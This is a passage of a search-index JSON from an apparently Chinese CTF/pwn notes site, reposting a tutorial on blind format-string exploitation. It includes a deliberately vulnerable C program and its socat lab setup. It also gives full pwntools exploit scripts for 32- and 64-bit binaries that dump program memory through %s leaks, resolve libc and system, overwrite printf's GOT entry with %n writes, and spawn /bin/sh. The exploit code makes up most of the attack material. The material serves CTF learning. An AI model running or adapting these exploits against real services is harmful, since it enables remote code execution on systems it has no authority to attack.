\u884c\uff1a\u5904\u7406\u65e0\u5173\u6cc4\u9732\u7684\u7a0b\u5e8f\u6d41\u7a0b\u540e\uff0c\u8fdb\u5165\u683c\u5f0f\u5316\u5b57\u7b26\u4e32\u6f0f\u6d1e\u8f93\u5165\u72b6\u6001 24 \u884c\uff1a32 \u4f4d\u7cfb\u7edf\u52a0\u8f7d\u5730\u5740 9 \u884c\uff1a\"%9$s.TMP\" \u4e2d\u7684 .TMP \u65e2\u662f\u586b\u5145\u5bf9\u9f50\uff0c\u4e5f\u662f\u5206\u9694\u7b26\uff0c\u65b9\u4fbf\u540e\u9762\u5904\u7406\u6570\u636e 14 \u884c\uff1a\u4f7f\u7528binascii \u5c06\u6cc4\u6f0f\u51fa\u6765\u5b57\u7b26\u4e32\u6bcf\u4e00\u4e2a\u90fd\u4ece ascii \u8f6c\u6362\u4e3a \u5341\u516d\u8fdb\u5236\uff0c\u65b9\u4fbf\u663e\u793a 15 \u884c\uff1ar.recvrepeat(0.2) \u63a5\u53d7\u8fd4\u56de\u7684\u5783\u573e\u6570\u636e\uff0c\u65b9\u4fbf\u4e0b\u4e00\u8f6e\u7684\u8f93\u5165 30 \u884c\uff1a\u6cc4\u6f0f\u5730\u5740\u52a8\u6001\u589e\u52a0\uff0c\u5047\u5982\u6cc4\u6f0f 1 \u5b57\u8282\u5c31\u589e\u52a0 1 \uff1b\u6cc4\u6f0f 3 \u5b57\u8282\u5c31\u589e\u52a0 3 31-33 \u884c\uff1a\u5904\u7406\u6cc4\u6f0f\u957f\u5ea6\u4e3a 0 \uff0c\u4e5f\u5c31\u662f\u6570\u636e\u662f \\x00 \u7684\u60c5\u51b5\u3002\u5730\u5740\u589e\u52a0 1 \uff0c\u7a0b\u5e8f\u6570\u636e\u52a0 \\x00 \u8fd0\u884c\u4e4b\u540e\uff0c\u8010\u5fc3\u7b49\u5f85\u6cc4\u6f0f\u5b8c\u6210\u3002\u6cc4\u6f0f\u51fa\u6765\u7684\u7a0b\u5e8f\u662f\u4e0d\u80fd\u8fd0\u884c\u7684\uff0c\u4f46\u53ef\u4ee5\u5728 ida \u8fdb\u8fc7\u5904\u7406\u53ef\u4ee5\u8fdb\u884c\u5206\u6790\u3001\u627e plt \u3001got.plt \u7b49\u3002 \u5c06\u6cc4\u6f0f\u51fa\u6765\u7684\u7a0b\u5e8f\uff0c\u653e\u5165 ida \uff0c\u542f\u52a8\u65f6\u9009\u62e9 \u4ee5 binary file \u52a0\u8f7d \uff0c\u52fe\u9009 Load as code segment \uff0c\u5e76 \u8c03\u6574\u504f\u79fb\u4e3a\uff1a 0x8048000 \uff08\u5f00\u59cb\u6cc4\u9732\u7684\u5730\u5740\uff09\uff1a \u53ef\u4ee5\u901a\u8fc7 shift+F12 \u67e5\u5b57\u7b26\u4e32\u5b9a\u4f4d\u5230 main \u51fd\u6570\uff0c\u7136\u540e\u76f4\u63a5 F5 \u53cd\u7f16\u8bd1\uff1a \u57fa\u672c\u7ed3\u6784\u5df2\u7ecf\u51fa\u6765\u4e86\uff0c\u76f2\u6253\u6ca1\u6709\u6e90\u4ee3\u7801\uff0c\u5c31\u9700\u8981\u6839\u636e\u4f20\u5165\u53c2\u6570\u53bb\u5224\u65ad\u54ea\u4e2a sub_xxx \u662f\u54ea\u4e2a\u51fd\u6570\u4e86\u3002\u6bd4\u5982\u8f93\u51fa\u683c\u5f0f\u5316\u5b57\u7b26\u4e32\u7684 sub_8048490 \u5c31\u662f printf \u3002 \u4ece .text \u6bb5\u5f00\u59cb \u7a0b\u5e8f\u542f\u52a8\u8fc7\u7a0b\uff1a \u4ece _start \u51fd\u6570\u5f00\u59cb\u5c31\u662f .text \u6bb5\uff0c\u53ef\u4ee5\u5728 ida \u4e2d\u6253\u5f00\u4e00\u4e2a\u6b63\u5e38\u7684 binary \u89c2\u5bdf text \u6bb5\u5f00\u5934\u7b2c\u4e00\u4e2a\u51fd\u6570\u5c31\u662f _stat \uff1a\uff08\u56fe\u4e3a 32 \u4f4d\u7a0b\u5e8f\uff09 \u5148\u7528 %p \u6cc4\u9732\u51fa\u6808\u4e0a\u6570\u636e\uff0c\u627e\u5230\u4e24\u4e2a\u76f8\u540c\u5730\u5740\uff0c\u800c\u4e14\u8fd9\u4e2a\u5730\u5740\u5f88\u9760\u8fd1\u7a0b\u5e8f\u52a0\u8f7d\u521d\u5730\u5740\uff0832\u4f4d\uff1a0x8048000\uff1b64\u4f4d\uff1a0x400000\uff09\u3002\u811a\u672c\u5982\u4e0b\uff1a from pwn import * import sys p = remote('127.0.0.1',10001) p.recv() p.sendline('nameaaa') p.recv() def where_is_start(ret_index=null): return_addr=0 for i in range(400): payload = '%%%d$p.TMP' % (i) p.sendline(payload) p.recvuntil('right:') val = p.recvuntil('.TMP') log.info(str(i*4)+' '+val.strip().ljust(10)) if(i*4==ret_index): return_addr=int(val.strip('.TMP').ljust(10)[2:],16) return return_addr p.recvrepeat(0.2) start_addr=where_is_start() \u6700\u540e\u5728\u504f\u79fb 1164 \u548c 1188 \u627e\u5230 text \u6bb5\u5730\u5740 0x8048510 \uff0c\u53ef\u4ee5\u5bf9\u6bd4\u4e0a\u56fe\uff0c\u4e0a\u56fe\u662f\u8fd9\u6761\u4f8b\u9898\u7684\u622a\u56fe\uff1a \u6cc4\u9732\u811a\u672c\u548c\u524d\u9762\u4e00\u6837\u53ea\u9700\u8981\u4fee\u6539\u4e00\u4e0b\u8d77\u59cb\u5730\u5740\uff1a #! /usr/bin/env python # -*- coding: utf-8 -*- from pwn import * import binascii context.log_level = 'info' r = remote('127.0.0.1',10001) def leak(addr): payload = \"%9$s.TMP\" + p32(addr) r.sendline(payload) print \"leaking:\", hex(addr) r.recvuntil('right:') ret = r.recvuntil(\".TMP\",drop=True) print \"ret:\", binascii.hexlify(ret), len(ret) remain = r.recvrepeat(0.2) return ret # name r.recv() r.sendline('nameaaa') r.recv() # leak begin = 0x8048510 #begin = 0x8048000 text_seg ='' try: while True: ret = leak(begin) text_seg += ret begin += len(ret) if len(ret) == 0: # nil begin +=1 text_seg += '\\x00' except Exception as e: print e finally: print '[+]',len(text_seg) with open('dump_bin_text','wb') as f: f.write(text_seg) \u5c06\u6cc4\u9732\u6587\u4ef6\u653e\u5165 ida \u5206\u6790\uff0c\u542f\u52a8\u65f6\u9009\u62e9 \u4ee5 binary file \u52a0\u8f7d \uff0c\u52fe\u9009 Load as code segment \uff0c\u5e76 \u8c03\u6574\u504f\u79fb\u4e3a\uff1a 0x8048510 \uff08\u5f00\u59cb\u6cc4\u9732\u5730\u5740\uff09\uff1a \u627e\u5230 main \u51fd\u6570\u5728 0x0804860B \uff0c\u9700\u8981\u5c06\u8fd9\u90e8\u5206\u5b9a\u4e49\u4e3a\u51fd\u6570\u624d\u80fd\u53cd\u7f16\u8bd1\uff0c\u53f3\u952e\u5730\u5740\u9694\u58c1\u7684\u540d\u79f0 loc_804860B \uff0ccreat function \u3002 \u7ea2\u8272\u90e8\u5206\u5c31\u662f\u6ca1\u6709\u6cc4\u9732\u51fa\u6765\u7684\u51fd\u6570\uff0c\u540e\u9762\u8ddf\u7684\u5c31\u662f\u51fd\u6570 plt \u5730\u5740\u3002 \u4e24\u79cd\u65b9\u6cd5\u5404\u6709\u4e0d\u540c\uff0c\u7ed3\u5408\u5b9e\u9645\u4f7f\u7528\u3002 \u89e3\u9898\u6d41\u7a0b \u7740\u91cd\u8bb0\u5f55 \u683c\u5f0f\u5316\u5b57\u7b26\u4e32\u76f2\u6253 \uff0c\u4e0d\u4e00\u6b65\u4e00\u6b65\u5206\u6790\u8fd9\u9053\u9898\u76ee\u6f0f\u6d1e\uff08\u8be6\u7ec6\u5206\u6790\uff1a \u9ed8\u5c0f\u897f \u535a\u5ba2\uff09\u3002\u8fd9\u9053\u9898\u76ee\u601d\u8def\u662f\uff1a \u786e\u5b9a printf \u7684 plt \u5730\u5740 \u901a\u8fc7\u6cc4\u9732 plt \u8868\u4e2d\u7684\u6307\u4ee4\u5185\u5bb9\u786e\u5b9a\u5bf9\u5e94\u7684 got.plt \u8868\u5730\u5740 \u901a\u8fc7\u6cc4\u9732\u7684 got.plt \u8868\u5730\u5740\u6cc4\u9732 printf \u51fd\u6570\u7684\u5730\u5740 \u901a\u8fc7\u6cc4\u9732\u7684 printf \u7684\u51fd\u6570\u5730\u5740\u786e\u5b9a libc \u57fa\u5740\uff0c\u4ece\u800c\u83b7\u5f97 system \u5730\u5740 \u4f7f\u7528\u683c\u5f0f\u5316\u5b57\u7b26\u4e32\u7684\u4efb\u610f\u5199\u529f\u80fd\u5c06 printf \u7684 got.plt \u8868\u4e2d\u7684\u5730\u5740\u4fee\u6539\u4e3a system \u7684\u5730\u5740 send \u5b57\u7b26\u4e32 \u201c/bin/sh\u201d \uff0c\u90a3\u4e48\u5728\u8c03\u7528 printf(\u201c/bin/sh\u201d) \u7684\u65f6\u5019\u5b9e\u9645\u4e0a\u8c03\u7528\u7684\u662f system(\u201c/bin/sh;\u201d) \uff0c\u4ece\u800c\u6210\u529f\u83b7\u53d6shell \u786e\u5b9a printf \u7684 plt \u5730\u5740 \u5c06\u6cc4\u9732\u51fa\u6765\u7684\u7a0b\u5e8f\uff0c\u653e\u5165 ida \u4e2d\u5206\u6790\u83b7\u5f97\uff0c\u51fd\u6570\u540d\u540e\u534a\u622a\u5c31\u662f\u5730\u5740 0x8048490 \uff1a \u6cc4\u9732 got.plt \u548c\u6cc4\u9732\u7a0b\u5e8f payload \u9ad8\u5ea6\u76f8\u4f3c\uff1a payload = \"%9$sskye\" + p32(printf_plt) p.sendline(payload) # \\xff\\x25 junk code p.recvuntil('right:\\xff\\x25') printf_got_plt = u32(p.recv(4)) \u6ce8\u89e3\uff1a \u4e3a\u4ec0\u4e48\u63a5\u6536 'right:\\xff\\x25' \uff1f right: \u662f\u56fa\u5b9a\u56de\u663e\uff0c\\xff\\x25 \u662f\u65e0\u7528\u5b57\u8282\u7801\u3002\u5b9e\u9645\u4e0a 0x8048490 \u7684\u6c47\u7f16\u662f\u8fd9\u6837\u7684\uff1a pwndbg> pdisass 0x8048490 \u25ba 0x8048490 <printf@plt> jmp dword ptr [0x804a018] <0xf7e4d670> 0x8048496 <printf@plt+6> push 0x18 0x804849b <printf@plt+11> jmp 0x8048450 # \u5b57\u8282\u7801 pwndbg> x /20wx 0x8048490 0x8048490 <printf@plt>: 0xa01825ff 0x18680804 0xe9000000 0xffffffb0 0x8048490 \u6307\u5411\u662f\u4e00\u6761\u8df3\u8f6c got.plt \u6307\u4ee4\uff0c\u6211\u4eec\u9700\u8981\u5176\u4e2d\u8df3\u8f6c\u7684\u76ee\u6807\u5730\u5740\u3002\\xff\\x25 \u5c31\u662f\u8df3\u8f6c\u6307\u4ee4\u7684\u5b57\u8282\u7801\uff0c\u6211\u4eec\u5c31\u8981\u5148\u63a5\u6536 2 \u5b57\u8282\u5783\u573e\u6570\u636e\uff0c\u7136\u540e\u518d\u63a5\u6536 4 \u5b57\u8282\u7684 got.plt \u5730\u5740\u3002 \u6cc4\u9732 printf \u51fd\u6570\u7684\u5730\u5740 \u6784\u9020\u65b9\u6cd5\u540c\u4e0a\uff0c\u4f46\u4e0d\u9700\u8981\u63a5\u6536 2 \u5b57\u8282\u5783\u573e\u6570\u636e\uff1a payload = \"%9$sskye\" + p32(printf_got_plt) p.sendline(payload) p.recvuntil('right:') printf_got = u32(p.recv(4)) \u6cc4\u9732 libc \u57fa\u5740& system \u5730\u5740 \u9898\u76ee\u6ca1\u6709\u7ed9\u51fa libc \u3002\u4ece\u6cc4\u9732\u51fa\u6765\u7684 printf@got \u53bb libcdatabase \u67e5\u8be2\u5176\u4ed6\u51fd\u6570\u504f\u79fb\u3002 printf:0x00049670 system:0x0003ada0 \u4efb\u610f\u5199\u4fee\u6539 printf@got.plt payload = fmtstr_payload(7, {printf_got_plt: system_addr}) p.sendline(payload) exp #!/usr/bin/env python # -*- coding: utf-8 -*- # @Author : MrSkYe # @Email : skye231@foxmail.com # @File : leakmemory_remote.py from pwn import * import binascii context.log_level = 'debug' p = remote('127.0.0.1',10001) def leak(addr): payload = \"%9$s.TMP\" + p32(addr) p.sendline(payload) print \"leaking:\", hex(addr) p.recvuntil('right:') resp = p.recvuntil(\".TMP\") ret = resp[:-4:] print \"ret:\", binascii.hexlify(ret), len(ret) remain = p.recvrepeat(0.2) return ret printf_plt = 0x8048490 # name p.recv() p.sendline('nameaaa') p.recv() # leak printf@got.plt payload = \"%9$sskye\" + p32(printf_plt) p.sendline(payload) # \\xff\\x25 junk code p.recvuntil('right:\\xff\\x25') printf_got_plt = u32(p.recv(4)) log.info(\"printf_got_plt:\"+hex(printf_got_plt)) # leak printf@got payload = \"%9$sskye\" + p32(printf_got_plt) p.sendline(payload) p.recvuntil('right:') printf_got = u32(p.recv(4)) log.info(\"printf_got:\"+hex(printf_got)) # libcdatabase libc_base = printf_got - 0x00049670 log.info(\"libc_base:\"+hex(libc_base)) system_addr = libc_base + 0x0003ada0 log.info(\"system_addr:\"+hex(system_addr)) # overwrite payload = fmtstr_payload(7, {printf_got_plt: system_addr}) p.sendline(payload) p.sendline('/bin/sh\\x00') p.interactive() 64 \u4f4d\u5229\u7528\u624b\u6cd5 \u5b9e\u9a8c\u73af\u5883\u51c6\u5907 \u8fd8\u662f\u4f7f\u7528 32 \u4f4d\u7684\u4f8b\u9898\u6e90\u7801\uff0c\u7f16\u8bd1 64 \u4f4d\u7a0b\u5e8f\uff1a gcc -z execstack -fno-stack-protector -o leakmemory_64 leakmemory.c \u7528 socat \u6302\u5230\u7aef\u53e3 10001 \u4e0a\u90e8\u7f72\uff1a socat TCP4-LISTEN:10000,fork EXEC:./leakmemory \u5b9e\u9a8c\u73af\u5883\u5b8c\u6210\uff0c\u5982\u679c\u662f\u672c\u5730\u90e8\u7f72\u7684\u8bdd\uff0c\u7b49\u7b49\u5728 exp \u91cc\u9762\u5199 remote(\"127.0.0.1\",10000) \u6a21\u62df\u6ca1\u6709 binary \u7684\u8fdc\u7a0b\u76f2\u6253\u3002 \u786e\u5b9a\u7a0b\u5e8f\u7684\u4f4d\u6570 \u586b\u5145 8 \u5b57\u8282\uff0c\u7136\u540e\u518d\u586b\u5165 %p \uff0c\u56de\u663e\u957f\u5ea6\u662f 8 \u5b57\u8282\u3002 \u786e\u5b9a\u683c\u5f0f\u5316\u5b57\u7b26\u4e32\u504f\u79fb \u6700\u540e\u786e\u8ba4\u504f\u79fb\u4e3a 8 \u3002 dump \u7a0b\u5e8f \u4ece\u7a0b\u5e8f\u52a0\u8f7d\u5730\u65b9\u5f00\u59cb\uff0c\u6216\u8005\u4ece text \u6bb5\u5f00\u59cb\u53ef\u4ee5\u7684\u3002\u8fd9\u91cc\u4e0d\u518d\u627e text \u6bb5\u8d77\u59cb\u4f4d\u7f6e\uff0c\u76f4\u63a5\u4ece\u7a0b\u5e8f\u52a0\u8f7d\u5730\u65b9\u5f00\u59cb\u6cc4\u9732\u3002\u4e24\u4e2a\u4f4d\u6570\u7a0b\u5e8f\u811a\u672c\u901a\u7528\u7684\uff0c\u6539\u4e00\u4e0b\u53c2\u6570\u5373\u53ef\u3002 64 \u4f4d\u7a0b\u5e8f\u52a0\u8f7d\u8d77\u59cb\u5730\u5740\u662f\uff1a0x400000 \uff0c\u4e0b\u9762\u662f\u5bf9\u6bd4\u56fe\uff1a \u811a\u672c\u8fd8\u662f\u90a3\u4e2a\u811a\u672c\uff0c\u6539\u4e00\u4e0b\u53c2\u6570\u5373\u53ef\uff1a #! /usr/bin/env python # -*- coding: utf-8 -*- from pwn import * import binascii context.log_level = 'info' #r = remote('127.0.0.1',10001) r = remote('127.0.0.1',10000) def leak(addr): payload = \"%9$s.TMP\" + p64(addr) r.sendline(payload) print \"leaking:\", hex(addr) r.recvuntil('right:') ret = r.recvuntil(\".TMP\",drop=True) print \"ret:\", binascii.hexlify(ret), len(ret) remain = r.recvrepeat(0.2) return ret # name r.recv() r.sendline('moxiaoxi') r.recv() # leak begin = 0x400000#0x8048000 text_seg ='' try: while True: ret = leak(begin) text_seg += ret begin += len(ret) if len(ret) == 0: # nil begin +=1 text_seg += '\\x00' except Exception as e: print e finally: print '[+]',len(text_seg) with open('dump_bin_64','wb') as f: f.write(text_seg) ida \u52a0\u8f7d\u53c2\u6570\u5982\u56fe\uff1a \u901a\u8fc7\u5b57\u7b26\u4e32\u5b9a\u4f4d\u5230 main \u51fd\u6570\uff0c\u8fd9\u91cc\u6ca1\u6709\u8bc6\u522b\u4e3a\u51fd\u6570\uff0c\u9700\u8981\u624b\u52a8\u521b\u5efa\u51fd\u6570\u3002\u5728 0x0400826 \u53f3\u952e creat function \uff0c\u7136\u540e\u5c31\u53ef\u4ee5\u53cd\u6c47\u7f16\u4e86\u3002 \u70b9\u8fdb printf@plt \uff0c\u91cc\u9762\u662f\u8df3\u8f6c\u5230 printf@got.plt \u6307\u4ee4\uff0c\u4e5f\u5c31\u662f\u4ece ida \u77e5\u9053\u4e86\uff1a printf_plt = 0x4006B0 printf_got_plt = 0x601030 \u89e3\u9898\u601d\u8def\u4e0e 32 \u4f4d\u4e00\u81f4\uff0c\u5229\u7528\u811a\u672c\uff1a #!/usr/bin/env python # -*- coding: utf-8 -*- # @Author : MrSkYe # @Email : skye231@foxmail.com # @File : leakmemory_64_remote.py from pwn import * import binascii context.log_level = 'debug' p = remote('127.0.0.1',10000) def leak(addr): payload = \"%9$s.TMP\" + p64(addr) p.sendline(payload) print \"leaking:\", hex(addr) p.recvuntil('right:') resp = p.recvuntil(\".TMP\") ret = resp[:-4:] print \"ret:\", binascii.hexlify(ret), len(ret) remain = p.recvrepeat(0.2) return ret printf_plt = 0x4006B0 printf_got_plt = 0x601030 # name p.recv() p.sendline('moxiaoxi') p.recv() # leak printf@got payload = \"%9$s.TMP\" + p64(printf_got_plt+1) p.sendline(payload) p.recvuntil('right:') printf_got = u64(p.recv(5).ljust(7,'\\x00')+'\\x00')<<8 log.info(\"printf_got:\"+hex(printf_got)) # libcdatabase libc_base = printf_got - 0x055800 log.info(\"libc_base:\"+hex(libc_base)) system_addr = libc_base + 0x045390 log.info(\"system_addr:\"+hex(system_addr)) one = p64(system_addr)[:2] two = p64(system_addr>>16)[:2] payload = \"%9104c%12$hn%54293c%13$hn\" + 'a'*7 payload += p64(printf_got_plt) + p64(printf_got_plt+2) p.sendline(payload) p.recv() p.sendline('/bin/sh\\x00') p.interactive() \u66f4\u591a\u5b9e\u4f8b axb_2019_fmt32 BUU \u4e0a\u6709\u5b9e\u9a8c\u73af\u5883\uff0c\u5ffd\u7565\u63d0\u4f9b\u7684\u4e8c\u8fdb\u5236\u6587\u4ef6\uff0c\u5c31\u662f\u76f2\u6253\u9898\u76ee axb_2019_fmt64 BUU \u4e0a\u6709\u5b9e\u9a8c\u73af\u5883\uff0c\u5ffd\u7565\u63d0\u4f9b\u7684\u4e8c\u8fdb\u5236\u6587\u4ef6\uff0c\u5c31\u662f\u76f2\u6253\u9898\u76ee SuCTF2018 - lock2 \u4e3b\u529e\u65b9\u63d0\u4f9b\u4e86 docker \u955c\u50cf: suctf/2018-pwn-lock2 \u53c2\u8003 ctf-wiki leak me pwn-\u76f2\u6253","title":"\u683c\u5f0f\u5316\u5b57\u7b26\u4e32\u76f2\u6253"},{"location":"fmtstr/Bilnd_Pwn/#bilnd-","text":"\u6587\u7ae0\u9996\u53d1\u4e8e \u5408\u5929\u4f17\u667a \uff0c\u8f6c\u8f7d\u5230\u535a\u5ba2\u4ec5\u4f5c\u5907\u4efd","title":"\u3010\u8f6c\u3011Bilnd-\u683c\u5f0f\u5316\u5b57\u7b26\u4e32\u76f2\u6253"},{"location":"fmtstr/Bilnd_Pwn/#_1","text":"\u683c\u5f0f\u5316\u5b57\u7b26\u4e32\u539f\u7406&\u5229\u7528 got & plt \u8c03\u7528\u5173\u7cfb \u7a0b\u5e8f\u7684\u4e00\u822c\u542f\u52a8\u8fc7\u7a0b","title":"\u53ef\u80fd\u9700\u8981\u63d0\u524d\u4e86\u89e3\u7684\u77e5\u8bc6"},{"location":"fmtstr/Bilnd_Pwn/#_2","text":"\u683c\u5f0f\u5316\u5b57\u7b26\u4e32\u76f2\u6253\u6307\u7684\u662f\u53ea\u7ed9\u51fa\u53ef\u4ea4\u4e92\u7684 ip \u5730\u5740\u4e0e\u7aef\u53e3\uff0c\u4e0d\u7ed9\u51fa\u5bf9\u5e94\u7684 binary \u6587\u4ef6\u6765\u8ba9\u6211\u4eec\u65e0\u6cd5\u901a\u8fc7 IDA \u5206\u6790\uff0c\u5176\u5b9e\u8fd9\u4e2a\u548c BROP \u5dee\u4e0d\u591a\uff0c\u4e0d\u8fc7 BROP \u5229\u7528\u7684\u662f\u6808\u6ea2\u51fa\uff0c\u800c\u8fd9\u91cc\u6211\u4eec\u5229\u7528\u7684\u662f\u65e0\u9650\u683c\u5f0f\u5316\u5b57\u7b26\u4e32\u6f0f\u6d1e\uff0c\u628a\u5728\u5185\u5b58\u4e2d\u7684\u7a0b\u5e8f\u7ed9 dump \u4e0b\u6765\u3002 \u4e00\u822c\u6765\u8bf4\uff0c\u6211\u4eec\u6309\u7167\u5982\u4e0b\u6b65\u9aa4\u8fdb\u884c \u786e\u5b9a\u7a0b\u5e8f\u7684\u4f4d\u6570\uff08\u4e0d\u540c\u4f4d\u6570\u6709\u4e9b\u8bb8\u5dee\u522b\uff09 \u786e\u5b9a\u6f0f\u6d1e\u4f4d\u7f6e \u5229\u7528","title":"\u539f\u7406"},{"location":"fmtstr/Bilnd_Pwn/#_3","text":"\u53ef\u4ee5\u8bfb\u5165 '\\x00' \u5b57\u7b26\u7684 \u8f93\u51fa\u51fd\u6570\u5747\u662f '\\x00' \u622a\u65ad\u7684 \u80fd\u65e0\u9650\u4f7f\u7528\u683c\u5f0f\u5316\u5b57\u7b26\u4e32\u6f0f\u6d1e","title":"\u4f7f\u7528\u6761\u4ef6"},{"location":"fmtstr/Bilnd_Pwn/#32","text":"","title":"32 \u4f4d\u5229\u7528\u624b\u6cd5"},{"location":"fmtstr/Bilnd_Pwn/#_4","text":"\u7a0b\u5e8f\u6e90\u7801\u5982\u4e0b\uff1a #include <stdio.h> #include <string.h> #include <unistd.h> int main(int argc, char *argv[]) { setbuf(stdin, 0LL); setbuf(stdout, 0LL); setbuf(stderr, 0LL); int flag; char buf[1024]; FILE* f; puts(\"What's your name?\"); fgets(buf, 1024, stdin); printf(\"Hi, \"); printf(\"%s\",buf); putchar('\\n'); flag = 1; while (flag == 1){ puts(\"Do you want the flag?\"); memset(buf,'\\0',1024); read(STDIN_FILENO, buf, 100); if (!strcmp(buf, \"no\\n\")){ printf(\"I see. Good bye.\"); return 0; }else { printf(\"Your input isn't right:\"); printf(buf); printf(\"Please Try again!\\n\"); } fflush(stdout); } return 0; } \u7f16\u8bd1 32 \u4f4d\u6587\u4ef6\uff1a gcc -z execstack -fno-stack-protector -m32 -o leakmemory leakmemory.c \u7528 socat \u6302\u5230\u7aef\u53e3 10001 \u4e0a\u90e8\u7f72\uff1a socat TCP4-LISTEN:10001,fork EXEC:./leakmemory \u5b9e\u9a8c\u73af\u5883\u5b8c\u6210\uff0c\u5982\u679c\u662f\u672c\u5730\u90e8\u7f72\u7684\u8bdd\uff0c\u7b49\u7b49\u5728 exp \u91cc\u9762\u5199 remote(\"127.0.0.1\",10001) \u6a21\u62df\u6ca1\u6709 binary \u7684\u8fdc\u7a0b\u76f2\u6253\u60c5\u51b5\u3002","title":"\u5b9e\u9a8c\u73af\u5883\u51c6\u5907"},{"location":"fmtstr/Bilnd_Pwn/#_5","text":"\u7528 %p \u770b\u770b\u7a0b\u5e8f\u56de\u663e\u8f93\u51fa\u7684\u957f\u5ea6\u662f\u591a\u5c11\uff0c\u4ee5\u6b64\u5224\u65ad\u7a0b\u5e8f\u7684\u4f4d\u6570\u3002\u8fd9\u91cc\u770b\u5230\u56de\u663e\u662f 4 \u4e2a\u5b57\u8282\uff0c\u5224\u65ad\u662f 32 \u4f4d\u7a0b\u5e8f\u3002\u53ef\u4ee5\u518d\u591a\u6cc4\u9732\u51e0\u4e2a\uff0c\u90fd\u662f 4 \u5b57\u8282\uff08\u542b\uff09\u4ee5\u4e0b\u7684\uff0c\u786e\u5b9a\u4e3a 32 \u4f4d\u7a0b\u5e8f\u3002","title":"\u786e\u5b9a\u7a0b\u5e8f\u7684\u4f4d\u6570"},{"location":"fmtstr/Bilnd_Pwn/#_6","text":"\u627e\u5230\u683c\u5f0f\u5316\u5b57\u7b26\u4e32\u7684\u504f\u79fb\u662f\u591a\u5c11\uff0c\u5728\u540e\u7eed\u64cd\u4f5c\u4e2d\u4f1a\u7528\u5230\u3002\u7531\u4e8e\u6ca1\u6709 binary \u4e0d\u80fd\u901a\u8fc7\u8c03\u8bd5\u5206\u6790\u504f\u79fb\uff0c\u5c31\u91c7\u53d6\u8f93\u5165\u591a\u4e2a %p \u6cc4\u9732\u51fa\u504f\u79fb\u3002\u4e3a\u4e86\u5bb9\u6613\u8fa8\u8ba4\uff0c\u5b57\u7b26\u4e32\u5f00\u59cb\u5148\u586b\u5145 4 \u5b57\u8282 \u7684\u586b\u5145\uff0864\u4f4d8\u5b57\u8282\uff09\uff0c\u7136\u540e\u518d\u586b\u5165 %p \u3002 \u6700\u540e\u786e\u8ba4\u504f\u79fb\u4e3a 7 \u3002","title":"\u786e\u5b9a\u683c\u5f0f\u5316\u5b57\u7b26\u4e32\u504f\u79fb"},{"location":"fmtstr/Bilnd_Pwn/#dump","text":"dump \u7a0b\u5e8f\u5e94\u8be5\u9009\u54ea\u4e2a\u683c\u5f0f\u5316\u5b57\u7b26\u4e32\uff1a %n$s \uff1a\u5c06\u7b2c n \u4e2a\u53c2\u6570\u7684\u503c\u4f5c\u4e3a\u5730\u5740\uff0c\u8f93\u51fa\u8fd9\u4e2a\u5730\u5740\u6307\u5411\u7684\u5b57\u7b26\u4e32\u5185\u5bb9 %n$p \uff1a\u5c06\u7b2c n \u4e2a\u53c2\u6570\u7684\u503c\u4f5c\u4e3a\u5185\u5bb9\uff0c\u4ee5\u5341\u516d\u8fdb\u5236\u5f62\u5f0f\u8f93\u51fa \u6211\u4eec\u662f\u9700\u8981 dump \u7a0b\u5e8f\uff0c\u4e5f\u5c31\u662f\u60f3\u83b7\u53d6\u6211\u4eec\u6240\u7ed9\u5b9a\u5730\u5740\u7684\u5185\u5bb9\uff0c\u800c\u4e0d\u662f\u83b7\u53d6\u6211\u4eec\u7ed9\u5b9a\u7684\u5730\u5740\u3002\u6240\u4ee5\u5e94\u8be5\u7528 %n$s \u628a\u6211\u4eec\u7ed9\u5b9a\u5730\u5740\u5f53\u4f5c\u6307\u9488\uff0c\u8f93\u51fa\u7ed9\u5b9a\u5730\u5740\u6240\u6307\u5411\u7684\u5b57\u7b26\u4e32\u3002\u7ed3\u5408\u524d\u9762\u77e5\u9053\u683c\u5f0f\u5316\u5b57\u7b26\u4e32\u504f\u79fb\u4e3a 7 \uff0cpayload \u5e94\u8be5\u4e3a\uff1a %9$s.TMP[addr] \u3002 \u6ce8\u610f \uff1a\u4f7f\u7528 %s \u8fdb\u884c\u8f93\u51fa\u5e76\u4e0d\u662f\u4e00\u4e2a\u5b57\u8282\u4e00\u4e2a\u5b57\u8282\u8f93\u51fa\uff0c\u800c\u662f\u4e00\u76f4\u8f93\u51fa\u76f4\u5230\u9047\u5230 \\x00 \u622a\u6b62\u7b26\u624d\u4f1a\u505c\u6b62\uff0c\u4e5f\u5c31\u662f\u6bcf\u6b21\u6cc4\u9732\u7684\u957f\u5ea6\u662f\u4e0d\u786e\u5b9a\u7684\uff0c\u53ef\u80fd\u5f88\u957f\u4e5f\u53ef\u80fd\u662f\u7a7a\u3002\u56e0\u4e3a .text \u6bb5\u5f88\u53ef\u80fd\u6709\u8fde\u7eed \\x00 \uff0c\u6240\u4ee5\u6cc4\u9732\u811a\u672c\u5904\u7406\u60c5\u51b5\u6709\uff1a \u9488\u5bf9\u6bcf\u6b21\u6cc4\u9732\u957f\u5ea6\u4e0d\u7b49\uff0caddr \u6839\u636e\u6bcf\u6b21\u6cc4\u9732\u957f\u5ea6\u52a8\u6001\u589e\u52a0\uff1b \u6cc4\u9732\u5b57\u7b26\u4e32\u53ef\u80fd\u4e3a\u7a7a\uff0c\u4e5f\u5c31\u662f\u5982\u4f55\u5904\u7406 \\x00 \uff1b \u9664\u6b64\u4e4b\u5916\uff0c\u8fd8\u6709\u4e00\u4e2a\u95ee\u9898\u662f\u6cc4\u9732\u7684\u8d77\u59cb\u5730\u5740\u5728\u54ea\u91cc\uff1f\u4ece\u5404\u4e2a\u5927\u4f6c\u6587\u7ae0\u5b66\u5230\u4e24\u79cd\u505a\u6cd5\uff1a\u4ece .text \u6bb5\u5f00\u59cb\uff1b\u4ece\u7a0b\u5e8f\u52a0\u8f7d\u5730\u65b9\u5f00\u59cb\uff1b\u4e24\u79cd\u65b9\u6cd5\u6cc4\u9732\u51fa\u6765\u7a0b\u5e8f\uff0c\u5728 ida \u4e2d\u5448\u73b0\u6709\u5dee\u522b\u3002","title":"dump \u7a0b\u5e8f"},{"location":"fmtstr/Bilnd_Pwn/#_7","text":"\u5148\u6765\u8bf4\u7701\u4e8b\u7684\uff0c \u4ece\u7a0b\u5e8f\u52a0\u8f7d\u5730\u65b9\u5f00\u59cb \u3002\u7a0b\u5e8f\u52a0\u8f7d\u5730\u65b9 32 \u4f4d\u548c 64 \u4f4d\u5404\u4e0d\u76f8\u540c\uff1a 32 \u4f4d\uff1a\u4ece 0x8048000 \u5f00\u59cb\u6cc4\u9732 64 \u4f4d\uff1a\u4ece 0x400000 \u5f00\u59cb\u6cc4\u9732 